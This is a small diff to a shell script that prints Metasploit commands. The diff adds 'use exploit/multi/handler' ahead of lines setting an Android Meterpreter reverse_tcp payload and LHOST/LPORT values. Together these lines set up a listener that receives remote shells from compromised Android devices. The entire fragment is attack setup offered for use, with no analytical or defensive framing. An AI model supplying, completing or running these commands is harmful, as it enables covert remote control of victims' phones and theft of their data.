@@ -16,6 +16,7 @@ clear
 
 # Display Metasploit commands
 echo "msfconsole"
+echo "use exploit/multi/handler"
 echo "set payload android/meterpreter/reverse_tcp"
 echo "set LHOST $n1"
 echo "set LPORT $n2"
